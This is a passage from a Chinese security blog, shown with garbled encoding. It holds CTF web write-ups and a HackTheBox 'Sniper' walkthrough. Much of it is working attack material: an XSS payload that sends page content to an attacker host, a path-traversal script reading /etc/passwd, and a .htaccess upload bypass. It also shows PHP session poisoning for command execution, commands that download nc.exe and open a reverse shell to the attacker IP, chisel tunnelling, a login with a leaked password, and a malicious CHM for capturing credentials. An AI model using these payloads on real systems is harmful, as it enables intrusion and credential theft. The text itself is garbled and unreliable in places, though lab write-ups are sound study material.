Image).src &#x3D; &#39;http:&#x2F;&#x2F;vpsip:port&#x2F;?data&#x3D;&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);&#x2F;\\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt; èµ·åˆ°çªƒå–iframeå†…å®¹çš„ä½œç”¨,è·å–çš„å†…å®¹æºè‡ªhero-bodyè¿™ä¸ªclassçš„å†…å®¹ã€‚æœ€åurlæäº¤vpsip:portå³å¯è§£ç å³å¯å‘ç°flag 12Howdy admin!flag&#123;ch41n_tHy_3Xploits_t0_w1n&#125; ImgAccess2è¿™é¢˜å¾ˆæœ‰è¥å…»ã€‚é¦–å…ˆä¸Šæ¥ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚æ ¹æ®é¢˜æ„åªèƒ½æ˜¯å›¾ç‰‡,åŒæ—¶ä¸Šä¼ åè¿›å…¥åˆ°uploadè·¯ç”±,å¹¶èƒ½é€šè¿‡/view/md5.../filenameè®¿é—®åˆ°è‡ªå·±çš„å›¾ç‰‡ é‚£ä¹ˆå½“ç„¶è¦è€ƒè™‘æ–‡ä»¶ä¸Šä¼ getshelläº†ã€‚ä½†æ˜¯é¦–å…ˆæ³¨æ„åˆ°,ä»é¢˜ç›®çš„è·¯ç”±ä¸cookieæ˜æ˜¾æé†’æˆ‘ä»¬è¿™æ˜¯pythonèµ·çš„webæœåŠ¡ã€‚ä½†æ˜¯åŒæ—¶è®¿é—®404æ—¶å‡ºç°çš„æ˜¯ç±»ä¼¼apacheçš„404é¡µé¢ å¹¶ä¸”è·¯å¾„ä¸Šå‡ºç°çš„æ˜¯/view/xxxxè€Œä¸æ˜¯upload/xxxxx,ä¹Ÿå°±æ„å‘³ç€ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºçœŸæ­£çš„ä¸Šä¼ è·¯å¾„ å°è¯•upload/xxx/1.jpgå‘ç°è¿”å›404 ä½†æ˜¯å°†uploadæ”¹ä¸ºuploadsæ—¶å‘ç°å¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬çš„ä¸Šä¼ å›¾ç‰‡äº†ã€‚ å› æ­¤ç¡®å®šï¼ŒçœŸå®çš„ä¸Šä¼ è·¯å¾„æ˜¯uploadsä¸”å¯ä»¥è®¿é—®åˆ°ã€‚æ­¤æ—¶è€ƒè™‘æ˜¯å¦èƒ½åˆ©ç”¨è¿™ä¸ªè·¯å¾„åšäº›æ–‡ç«  ç›¸å¯¹å®¹æ˜“æƒ³åˆ°çš„åº”è¯¥æ˜¯è·¯å¾„ç©¿è¶Šäº†ï¼Œä½†å°è¯•æ„é€ æ™®é€šè·¯å¾„ç©¿è¶Šå¤±è´¥ã€‚ä¸è¿‡è·¯å¾„ç©¿è¶Šè¿˜æœ‰ä¸€ç§ç›¸å¯¹æ¯”è¾ƒç†Ÿæ‚‰çš„ç»•è¿‡å§¿åŠ¿ã€‚æ¯”å¦‚urlencodeä¸¤æ¬¡çš„è·¯å¾„ç©¿è¶Š,(phpmyadmin4.8.1å°±æ›¾å‡ºç°è¿‡)é‚£ä¹ˆæ­¤å¤„å°è¯•å¯¹è·¯å¾„ç©¿è¶Šè¿›è¡ŒäºŒæ¬¡urlç¼–ç ../../../../../etc/passwd 12345678910import requestsfrom urllib.parse import quote_plus as urlencodeurl='http://xxxxxxx:7003/uploads/'filepath='../../../../../../etc/passwd'filepath=urlencode(filepath)filepath=urlencode(filepath)r=requests.get(url+filepath)print(r.text) å‘ç°æˆåŠŸè¯»å–äº†/etc/passwdæ¥ä¸‹æ¥è‚¯å®šæ˜¯æƒ³è¦å¾—åˆ°å…¶ä»–æœ‰ç”¨ä¿¡æ¯äº†ï¼Œæ¯”å¦‚app.pyçš„æºç æƒ³å…ˆè¯»/proc/self/environ,å‘ç°æ²¡å†…å®¹ã€‚ä½†æ˜¯ä¸è¦ç´§ï¼Œæ­¤æ—¶å¿…ç„¶å¯è¡Œçš„æ–¹æ³•æ˜¯åˆ©ç”¨/proc/self/cwdæŒ‡å‘å½“å‰å·¥ä½œç›®å½•çš„ç‰¹æ€§ï¼Œç›´æ¥è¯»å–app.py/proc/self/cwd/app.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from flask import Flask, render_template, request, flash, redirect, send_filefrom urllib.parse import urlparseimport reimport osfrom hashlib import md5import asyncioimport requestsapp = Flask(__name__)app.config['UPLOAD_FOLDER'] = os.path.join(os.curdir, \"uploads\")# app.config['UPLOAD_FOLDER'] = \"/uploads\"app.config['MAX_CONTENT_LENGTH'] = 1*1024*1024app.secret_key = b'_5#y2L\"F4Q8z\\n\\xec]/'ALLOWED_EXTENSIONS = &#123;'png', 'jpg', 's'&#125;if not os.path.exists(app.config['UPLOAD_FOLDER']): os.mkdir(app.config['UPLOAD_FOLDER'])def secure_filename(filename): return re.sub(r\"(\\.\\.|/)\", \"\", filename)def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(\"/\")def index(): return render_template(\"home.html\")@app.route(\"/upload\", methods=[\"POST\"])def upload(): caption = request.form[\"caption\"] file = request.files[\"image\"] if file.filename == '': flash('No selected file') return redirect(\"/\") elif not allowed_file(file.filename): flash('Please upload images only.') return redirect(\"/\") else: if not request.headers.get(\"X-Real-IP\"): ip = request.remote_addr else: ip = request.headers.get(\"X-Real-IP\") dirname = md5(ip.encode()).hexdigest() filename = secure_filename(file.filename) upload_directory = os.path.join(app.config['UPLOAD_FOLDER'], dirname) if not os.path.exists(upload_directory): os.mkdir(upload_directory) upload_path = os.path.join(app.config['UPLOAD_FOLDER'], dirname, filename) file.save(upload_path) return render_template(\"uploaded.html\", path = os.path.join(dirname, filename))@app.route(\"/view/&lt;path:path&gt;\")def view(path): return render_template(\"view.html\", path = path)@app.route(\"/uploads/&lt;path:path&gt;\")def uploads(path): # TODO(noob): # zevtnax told me use apache for static files. I've # already configured it to serve /uploads_apache but it # still needs testing. I'm a security noob anyways. return send_file(os.path.join(app.config['UPLOAD_FOLDER'], path))if __name__ == \"__main__\": app.run(port=5000) å‘ç°å‡ ä¸ªä¿¡æ¯ã€‚é¦–å…ˆæ˜¯uploadsè·¯ç”±é‡Œå­˜åœ¨æ˜æ˜¾çš„æç¤ºã€‚æš—ç¤ºæˆ‘ä»¬/uploads_apache/è·¯å¾„ ç„¶åæ˜¯æ–‡ä»¶åçš„æ£€æŸ¥ã€‚å¾ˆå¥‡æ€ªçš„æ˜¯æ–‡ä»¶åçš„ç™½åå•é‡Œæœ‰ä¸ªs.ä¹‹åå…ˆè°ƒç”¨allowed_file()è¿›è¡Œæ–‡ä»¶åç¼€æ£€æŸ¥ï¼Œç„¶åè°ƒç”¨secure_filename()è¿›è¡Œæ–‡ä»¶åæ£€æŸ¥ç¬¬ä¸€ä¸ªå‡½æ•°åªæ£€æŸ¥æœ€åä¸€ä¸ª.åçš„åç¼€ã€‚è€Œç¬¬äºŒä¸ªå‡½æ•°å°†..æ›¿æ¢ä¸ºç©ºé‚£ä¹ˆè¿™å¿…ç„¶å­˜åœ¨ç»•è¿‡.è”ç³»åˆ°è¿™æ˜¯ä¸€ä¸ªapacheæœåŠ¡å™¨,ä¸”åªå…è®¸å›¾ç‰‡ä¸Šä¼ ã€‚è€ƒè™‘ä¸Šä¼ .htaccessè¿›è¡ŒgetshellåŒæ—¶ä¸ºäº†ç»•è¿‡æ–‡ä»¶åï¼Œä½¿ç”¨.htacces..sç¬¬ä¸€ä¸ªå‡½æ•°æ£€æŸ¥æ—¶åˆ¤å®šåç¼€ä¸ºs,åœ¨ç™½åå•å†…ã€‚ç¬¬äºŒä¸ªå‡½æ•°å°†..æ›¿æ¢ä¸ºç©ºï¼ŒæˆåŠŸè¾¾åˆ°ä¸Šä¼ .htaccessçš„æ•ˆæœ å†…å®¹addtype application/x-httpd-php .jpgæˆåŠŸä¸Šä¼ ,ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬getshellã€‚ getshellåå‘ç°æ²¡æœ‰flag.æ¯”èµ›æ—¶é¢˜ç›®æœ‰æç¤ºflagåœ¨secretserver:1337ã€‚æ‰€ä»¥æ–¹ä¾¿ç›´æ¥ä¸‹æ‰‹ã€‚é¶æœºæ²¡æœ‰curlï¼Œé‚£å°±ç›´æ¥wgetå³å¯ã€‚ ä¸è¿‡å°±ç®—ä¸çŸ¥é“æç¤ºä¹Ÿå¯ä»¥åšï¼Œå®¹å™¨é‡Œæœ‰python3ï¼Œé‚£å°±è‚¯å®šå¯ä»¥æ¢æµ‹ç«¯å£ä»/etc/hostså¾—çŸ¥ipä¸º192.168.128.2.é‚£å°±é¡ºç€æ¢å§ã€‚ç”¨ä¸Šå¿˜è®°ä»å“ªä½å¤§ä½¬é‚£å«–æ¥çš„è„šæœ¬ï¼Œåšbuuæ—¶ç”¨è¿‡ã€‚ 123456789101112131415161718import socketdef foo(): with open('active_port.txt','at') as f: for i in range(65535+1): ip = '192.168.128.3' try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip,i)) s.close() f.writelines(str(i)+'\\n') except socket.error: pass f.close() passif __name__ == '__main__': foo() print('ok') ä¹Ÿå¯ä»¥å‘ç°1337ç«¯å£å¼€æ”¾ã€‚å…ˆwget 192.168.128.3:1337å¾—åˆ°index.htmlå…¶ä¸­å†…å®¹æç¤ºäº†./flag.txtç›´æ¥wget 192.168.128.3:1337/flag.txtå³å¯ Referenceshttps://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-Sniper--åˆå°windowsé¶æœº","slug":"hackthebox-Sniper-åˆå°windowsé¶æœº","date":"2020-04-01T03:55:54.000Z","updated":"2021-02-18T05:09:25.753Z","comments":true,"path":"2020/04/01/hackthebox-Sniper-åˆå°windowsé¶æœº/","link":"","permalink":"https://www.bycsec.top/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/","excerpt":"å¥½ä¹…æ²¡åšhtbçš„é¶æœºï¼Œè¿™æ¬¡åˆè·Ÿç€ç€å¤§ä½¬çš„æ€è·¯å»åšäº†ä¸€å°æ–°çš„é¶æœºã€‚ä¸åŒä»¥å¾€çš„æ˜¯,è¿™æ¬¡çš„é¶æœºSniperæ˜¯windowsé¶æœºï¼Œå› æ­¤ä¹Ÿæ”¶è·äº†è®¸å¤šæ–°å§¿åŠ¿ã€‚å°±æ˜¯åœ¨ä¸­é—´ä»githubä¸‹äº†ä¸å°‘ä¸œè¥¿â€¦â€¦å› ä¸ºä¸æ˜¯å‡æœŸï¼Œå…·ä½“è¿‡ç¨‹ä¸ä¼šåƒä»¥å¾€é‚£ä¹ˆè¯¦ç»†ã€‚åŒæ—¶windowsé¶æœºä¸‹è‡ªå·±ä¸å¤ªç†è§£çš„ä¸œè¥¿ä¹Ÿå¸Œæœ›ä¸ä¼šç»™åˆ«äººå¸¦è¿›è¯¯åŒºã€‚æœ‰è¶£çš„æ˜¯,è¿™å°é¶æœºè·å¾—webrootçš„shellæœ‰ä¸åŒçš„æ“ä½œæ–¹æ³•ï¼ŒåŒæ—¶å…·ä½“åé¢ææƒæ—¶ä¹Ÿå°†æœ‰ä¸åŒçš„æ–¹æ³•è¿›è¡Œç»†èŠ‚ä¸Šä¸åŒçš„æ“ä½œã€‚å…·ä½“ç»†èŠ‚å°†åœ¨åé¢çš„æ–‡ç« ä¸­æåˆ°ã€‚","text":"å¥½ä¹…æ²¡åšhtbçš„é¶æœºï¼Œè¿™æ¬¡åˆè·Ÿç€ç€å¤§ä½¬çš„æ€è·¯å»åšäº†ä¸€å°æ–°çš„é¶æœºã€‚ä¸åŒä»¥å¾€çš„æ˜¯,è¿™æ¬¡çš„é¶æœºSniperæ˜¯windowsé¶æœºï¼Œå› æ­¤ä¹Ÿæ”¶è·äº†è®¸å¤šæ–°å§¿åŠ¿ã€‚å°±æ˜¯åœ¨ä¸­é—´ä»githubä¸‹äº†ä¸å°‘ä¸œè¥¿â€¦â€¦å› ä¸ºä¸æ˜¯å‡æœŸï¼Œå…·ä½“è¿‡ç¨‹ä¸ä¼šåƒä»¥å¾€é‚£ä¹ˆè¯¦ç»†ã€‚åŒæ—¶windowsé¶æœºä¸‹è‡ªå·±ä¸å¤ªç†è§£çš„ä¸œè¥¿ä¹Ÿå¸Œæœ›ä¸ä¼šç»™åˆ«äººå¸¦è¿›è¯¯åŒºã€‚æœ‰è¶£çš„æ˜¯,è¿™å°é¶æœºè·å¾—webrootçš„shellæœ‰ä¸åŒçš„æ“ä½œæ–¹æ³•ï¼ŒåŒæ—¶å…·ä½“åé¢ææƒæ—¶ä¹Ÿå°†æœ‰ä¸åŒçš„æ–¹æ³•è¿›è¡Œç»†èŠ‚ä¸Šä¸åŒçš„æ“ä½œã€‚å…·ä½“ç»†èŠ‚å°†åœ¨åé¢çš„æ–‡ç« ä¸­æåˆ°ã€‚ æ”»å‡»æœºipï¼š kalilinux 10.10.15.189é¶æœºip windows10 10.10.10.151 ç«¯å£æ‰«æé¦–å…ˆæ˜¯è€å¥—çš„ç«¯å£æ‰«æ 1234567891011121314151617181920212223Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CSTNmap scan report for 10.10.10.151Host is up (0.24s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Sniper Co.135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h02m38s| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-04-01T08:23:29|_ start_date: N/A å¯ä»¥çœ‹åˆ°æ˜¯ä¸€å°windowsé¶æœºï¼Œé…æœ‰IISæœåŠ¡ã€‚ä¸è¿‡å¼€å¯çš„å‡ ä¸ªç«¯å£ä¸­åŒ…å«äº†445ç«¯å£,è¿™æ˜¯SMBæœåŠ¡å¼€æ”¾çš„ç«¯å£ã€‚ port 445: Microsoft Windows SMB Serverè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ è‘—åçš„æ°¸æ’ä¹‹è“æ¼æ´ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€ç«¯å£åˆ©ç”¨çš„ã€‚å½“ç„¶è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ¸—é€ç‚¹ï¼Œåªæ˜¯è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡smbserverè¿æ¥åˆ°é¶æœº,å°è¯•åŸºæœ¬çš„smbè¿æ¥çš„è¯å‘ç°å¿…ç„¶æ˜¯è¦å¯†ç çš„ã€‚ é‚£ä¹ˆè¿˜æ˜¯ä»80ç«¯å£å…¥æ‰‹ã€‚è®¿é—®ç½‘é¡µï¼Œå‘ç°æ˜¯phpç½‘é¡µã€‚IIS+phpå®é™…ä¸Šæ˜¯éå¸¸å¥‡æ€ªçš„é…ç½®,ä½†æˆ‘ä»¬æ˜¾ç„¶å¯ä»¥ä»¥æ­¤ä¸ºå…¥æ‰‹ç‚¹ã€‚ LFI/RFI=&gt;å‘½ä»¤æ‰§è¡Œ=&gt;webshellé¦–å…ˆåœ¨blogä¸‹å‘ç°ä¸€ä¸ªè¯­è¨€åˆ‡æ¢åŠŸèƒ½ï¼Œå…¶å‚æ•°å¯ä»¥æ–‡ä»¶åŒ…å«ã€‚/blog?lang=blog-en.phpå°è¯•ä¼ªåè®®ç­‰å¸¸è§„å¥—è·¯è¯»æºç å‡ä»¥å¤±è´¥å‘Šç»ˆã€‚ç®€å•è¯»windowsçš„æ–‡ä»¶?lang=/windows/system32/license.rtfå‘ç°æœ‰å›æ˜¾ã€‚é‚£ä¹ˆç°åœ¨ç›®çš„æ˜¯å¾—åˆ°ä¸€ä¸ªweb-rootçš„shellï¼Œå¦‚ä½•æ“ä½œå‘¢ï¼Ÿæ­¤æ—¶æœ‰ä¸€ç§ç›¸å¯¹â€ç®€å•â€çš„åŠæ³•,åˆ©ç”¨ä¸Šé¢æåˆ°çš„æ˜¯smbæœåŠ¡ã€‚æˆ‘ä»¬å†æœ¬æœºkaliæ–°å»ºä¸€ä¸ªsmbæœåŠ¡ï¼Œç„¶åç›´æ¥rfiè¿›è¡Œæ“ä½œã€‚RFIçš„åŸºæœ¬æ“ä½œå¥—è·¯å¦‚ä¸‹ 1&#x2F;?lang&#x3D;\\\\10.10.14.62\\share\\foo.php ä½†æ˜¯éœ€è¦æ³¨æ„ã€‚æƒ³é€šè¿‡SMBè¾¾æˆrfiæˆ‘ä»¬å¿…é¡»ä¿®æ”¹æœ¬æœºçš„æ˜¯smbæœåŠ¡çš„æƒé™,æ§åˆ¶æ–‡ä»¶å¤¹çš„æƒé™ä¸º777ç­‰ç­‰ï¼Œæ“ä½œèµ·æ¥å¯¹æˆ‘è¿™æ ·çš„å°ç™½è€Œè¨€ç›¸å¯¹å›°éš¾äº†ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å¾—åˆ°webshellå‘¢? æœ‰,è€Œè¿™ä¹Ÿæ˜¯æˆ‘å­¦åˆ°çš„ä¸åŒäºå¸¸è§„å¥—è·¯çš„æ–¹æ³•ã€‚å›åˆ°ä¹‹å‰phpç½‘é¡µçš„æ€è·¯ä¸Šã€‚æœ‰è¿™æ ·çš„ä¸€ä¸ªç»†èŠ‚å¯ä»¥æ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ªwindowsé¶æœºçš„phpæœåŠ¡ï¼Œå…¶sessionå€¼è¢«å­˜å‚¨åœ¨å›ºå®šçš„æ–‡ä»¶å¤¹äº†ã€‚æˆ‘ä»¬å°è¯•ä¸€ä¸‹éšæ„æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œå¹¶ä¸”è®°å½•ä¸‹sessionå€¼ã€‚é€šè¿‡ä¸‹é¢çš„payloadåŒ…å«session 1lang&#x3D;&#x2F;Windows&#x2F;Temp&#x2F;sess_1d6bfk00vc159thng1t5q521qg æ­¤æ—¶æŸ¥çœ‹åŒ…å«çš„ç»“æœï¼Œå‘ç°æ˜¯å«æœ‰ç”¨æˆ·åçš„åºåˆ—åŒ–æ•°æ®ã€‚é‚£ä¹ˆç±»ä¼¼äºä¹‹å‰tp5çš„sessionå›ºå®šå­˜å‚¨ç±»çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œä¸‹æ‰‹ï¼Œå°†phpä»£ç å†™å…¥sessionæ•°æ®ã€‚ é¦–å…ˆå°è¯•ç®€å•çš„fuzz,å‘ç°ç”¨æˆ·åè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºå¯è¡Œçš„payloadåŠå›æ˜¾ 123&lt;?=`whoami`?&gt;lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qgusername|s:13:\"nt authority\\iusr åˆ©ç”¨çŸ­æ ‡ç­¾åŠ åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œwhoamiã€‚æ¥ä¸‹æ¥å¯ä»¥å†™webshell,ä¹Ÿå¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ å°è¯•å¸¸è§„çš„powershellåå¼¹shellå¤±è´¥ã€‚ä¹‹åä¼šå‘ç°å¯èƒ½æ˜¯å› ä¸ºpowershellè¿è¡Œåœ¨constraintmodeçš„åŸå› ã€‚ä½†æ˜¯ä¸è¦ç´§ï¼Œåˆ©ç”¨lfi+å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬è¿˜æœ‰å…¶ä»–æ–¹æ³•æ‹¿åˆ°windowsé¶æœºçš„shellã€‚é¦–å…ˆæ‰¾åˆ°æœ¬æœºçš„netcat(å³å¹³æ—¶ä½¿ç”¨çš„nc),æŠŠå®ƒä¼ åˆ°windowsæœºä¸Šã€‚(å½“ç„¶éœ€è¦å…ˆå»ºå¥½wwwæ–‡ä»¶å¤¹,å¹¶æŠŠæœ¬æœºçš„nc.exeå¤åˆ¶åˆ°é‡Œé¢)payload: 1echo 'wget 10.10.15.189/nc.exe -O \\windows\\temp\\exp.exe' | iconv -t utf-16le | base64 -w 0 å°†å‡†å¤‡å¥½çš„payloadè¿›è¡Œç¼–ç é¿å…è¿‡æ»¤ã€‚æ³¨å†Œæ–°ç”¨æˆ·åä¸º 1&lt;?=`powershell /enc &#123;your encoded command &#125;`?&gt; è¿™é‡Œä½¿ç”¨/encæ˜¯powershellå¯¹åº”çš„è§£ç flag,æ²¡ä½¿ç”¨-encæ˜¯ä¸ºäº†è§£å†³è¿‡æ»¤é—®é¢˜ã€‚ç„¶ååŒ…å«å¯¹åº”çš„ç”¨æˆ·çš„sessionå³å¯æ‰§è¡Œã€‚å†åˆ©ç”¨lfiæ£€æŸ¥æ˜¯å¦å·²ç»æŠŠncä¼ ä¸Šå»äº† å¾ˆå¥½ã€‚é‚£ä¹ˆå†è¿›è¡Œåå¼¹shellçš„å‘½ä»¤å§ã€‚payload: 1echo 'c:\\windows\\temp\\exp.exe 10.10.15.189 8899 -e powershell' | iconv -t utf-16le | base64 -w 0 æœ¬æœºç›‘å¬8899.æµè§ˆå™¨åŒ…å«,å¹¶å¾—åˆ°webshell user shellæ‹¿åˆ°webshellåæˆ‘ä»¬é¦–å…ˆæ£€æŸ¥ä¸‹æºç ã€‚å¾ˆå¿«å°±æœ‰æ‰€å‘ç°\\user\\db.phpä¸­å¯ä»¥å‘ç°ä¸€ä¸ªæ•°æ®åº“çš„å¯†ç 36mEAhz/B8xQ~2VM.è€Œä¸”åœ¨Userä¸­å¯ä»¥å‘ç°ç”¨æˆ·Chrisçš„å­˜åœ¨ã€‚ä¸‹é¢å°è¯•æ‹¿åˆ°usershell.è¿™é‡Œå°†å†æ¬¡ç”¨åˆ°æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨è¿‡çš„ç«¯å£è½¬å‘ã€‚ä¸è¿‡éœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©æˆ‘ä»¬å®ç°ã€‚https://github.com/jpillora/chiselä»githubreleaseå¤„ä¸‹è½½chiselçš„linuxä¸windowsç‰ˆæœ¬ã€‚åˆ†åˆ«ç”¨äºæœ¬æœºä¸é¶æœºã€‚ç„¶åwgetæŠŠwindowsç‰ˆæœ¬çš„ä¼ è¾“åˆ°é¶æœºä¸Šã€‚ 123456kali: chmod +x chisel_linux_amd64./chisel_linux_amd64 server -p 8000 --reverseshell: wget http://10.10.15.189/chisel.exe -O chisel.exe portforwarding: .\\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306 å¼€å¯--reverseå…è®¸æˆ‘ä»¬è½¬å‘ç«¯å£ã€‚è€Œæœ€åä¸€æ­¥æˆ‘ä»¬æŠŠ5985ä¸3306ç«¯å£è½¬å‘åˆ°æœ¬åœ°ã€‚5985å¯¹åº”çš„æ˜¯WinRMæœåŠ¡ï¼Œå¯ç”¨äºè¿œç¨‹ç®¡ç†ã€‚æˆ‘ä»¬æŠŠå®ƒè½¬å‘åˆ°æœ¬åœ°åï¼Œå¯ä»¥åˆ©ç”¨å¦ä¸€ä¸ªæ¸—é€å·¥å…·evil-winrmè¿›è¡Œç”¨æˆ·ç™»å½•ã€‚ 12git clone https://github.com/Hackplayers/evil-winrmsudo gem install winrm winrm-fs stringio åªéœ€ä¸¤æ­¥å³å¯ä½¿ç”¨ã€‚ç„¶åevil-winrmç»§ç»­ç™»å½•ï¼Œç›´æ¥æœ¬åœ°127.0.0.1å³å¯ã€‚å› ä¸ºæˆ‘ä»¬ç«¯å£å·²ç»è½¬å‘å¥½äº†ã€‚./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1æ‹¿åˆ°usershell. ä¹‹æ‰€ä»¥ç”¨è¿™ä¹ˆå¤šå·¥å…·è¿›è¡Œuserçš„ææƒå…¶å®æ˜¯å› ä¸ºè¿™é‡Œæƒ³è¦é€šè¿‡å…¶ä»–æ–¹æ³•å¾—åˆ°usershellè¦å†æ¬¡åå¼¹shell.å¹¶ä¸”æ“ä½œèµ·æ¥æœ‰ç‚¹éº»çƒ¦.è¿™é‡Œæˆ‘ç®€å•æä¸€ä¸‹ï¼Œå°±æ˜¯ç›´æ¥é€šè¿‡powershellå‘½ä»¤åˆ›å»ºä¸€ä¸ªå±äºChrisçš„å˜é‡ï¼Œç„¶åå†åå¼¹shell. 123$pass = convertto-securestring '36mEAhz/B8xQ~2VM' -asplaintext -force$cred = new-object system.management.automation.pscredential(\"sniper\\chris\", $pass)invoke-command -computer sniper -scriptblock &#123; whoami &#125; -credential $cred å˜é‡æˆåŠŸåˆ›å»ºçš„è¯ï¼Œæœ€åä¸€æ¡å‘½ä»¤çš„å›æ˜¾åº”è¯¥æ˜¯sniper\\chrisç„¶åä¸‹é¢çš„å‘½ä»¤å¯ä»¥é‡æ–°å¼¹shellï¼Œå¾—åˆ°usershell 1invoke-command -computer sniper -scriptblock &#123; c:\\windows\\temp\\exp.exe 10.10.15.189 1234 -e powershell.exe &#125; -credential $cred rootshellé‚£ä¹ˆåˆåˆ°äº†æœ€åçš„rootææƒæ—¶é—´ã€‚åœ¨C:\\docsä¸­å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„txt 12345Hi Chris,Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.Regards,Sniper CEO. æœ‰æ„æ€ã€‚ä¼¼ä¹åœ¨æç¤ºæˆ‘ä»¬,ä¼ åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„ä¸œè¥¿å¯èƒ½ä¼šè¢«CEOæ£€æµ‹ã€‚è¿™ä¹Ÿå°±ç±»ä¼¼xssä¸­æˆ‘ä»¬çš„payloadè¢«æ£€æŸ¥æ—¶å¯ä»¥æ‰“åˆ°adminçš„cookie.è¿™é‡Œæˆ‘ä»¬æ˜¯å¦ä¹Ÿèƒ½é€šè¿‡å¯æ‰§è¡Œæ–‡ä»¶è®©administratoræ£€æŸ¥,æ‹¿åˆ°administratorçš„æƒé™å‘¢ï¼ŸåŒæ ·åœ¨Chrisçš„Downloadsç›®å½•ä¸‹æˆ‘ä»¬å‘ç°ä¸€ä¸ªinstructions.chmæ–‡ä»¶ã€‚æ‹¿åˆ°windowsæœ¬æœºæ‰“å¼€,å°†å‘ç°é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å°±æ˜¯è¦ä½¿ç”¨chmæ–‡ä»¶è¿›è¡Œæ“ä½œäº†ã€‚åŒæ—¶åˆ©ç”¨çš„æ€è·¯ä¹Ÿå¤§è‡´æ¸…æ¥šäº†ï¼š 1231.windowsæœ¬æœºä¸‹æ“ä½œç”Ÿæˆchmæ–‡ä»¶2.ä¸Šä¼ chmæ–‡ä»¶,å…¶ä¸­payloadå°†æ‰“åˆ°æœ¬æœº #ç±»ä¼¼xssçš„é“ç†3.ç›‘å¬æœ¬æœºï¼Œå¾—åˆ°administratorä¿¡æ¯ã€‚ ç®€å•æä¸‹chmæ–‡ä»¶ã€‚å…¶å®å°±æ˜¯htmlæ–‡ä»¶çš„å¸®åŠ©æ–‡ä»¶ç³»ç»Ÿã€‚è€Œä¸”æƒ³è¦æ“ä½œèµ·æ¥å¾ˆç®€å•,åªè¦åœ¨win10ç”µè„‘çš„C:\\Program Files (x86)\\HTML Help Workshopä¸­å³å¯æ‰¾åˆ°ã€‚å½“ç„¶æˆ‘ä»¬è¿˜è¦ä»å¾®è½¯å®˜ç½‘ä¸‹è½½æœ€æ–°çš„https://www.microsoft.com/en-us/download/details.aspx?id=21138å…ˆåˆ›å»ºä¸€ä¸ªhtmlæ–‡ä»¶ 1234567&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hacked by byc_404&lt;/h1&gt;&lt;img src=\\\\10.10.15.189\\htb\\23333.jpg/&gt;&lt;/body&gt;&lt;/html&gt; é‡Œé¢çš„srcèµ„æºæŒ‡å‘æˆ‘ä»¬æœ¬æœºä»»æ„èµ„æºï¼Œè¯´ç™½äº†å°±æ˜¯è®©adminè§¦å‘ä¸”æˆ‘ä»¬èƒ½æ”¶åˆ°è¯·æ±‚è€Œå·²ã€‚åœ¨windowsæœ¬æœºä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€hhw.exeï¼Œåˆ›å»ºtest.hppé¡¹ç›®æ·»åŠ æˆ‘ä»¬åˆšåˆšçš„index.htmlå¹¶ç¼–è¯‘ï¼Œå³å¯ç”Ÿæˆä¸€ä¸ªchmæ–‡ä»¶ã€‚ç„¶åå›åˆ°æœ¬æœº,å…ˆèµ·ä¸€ä¸ªç›‘å¬responder -I tun0 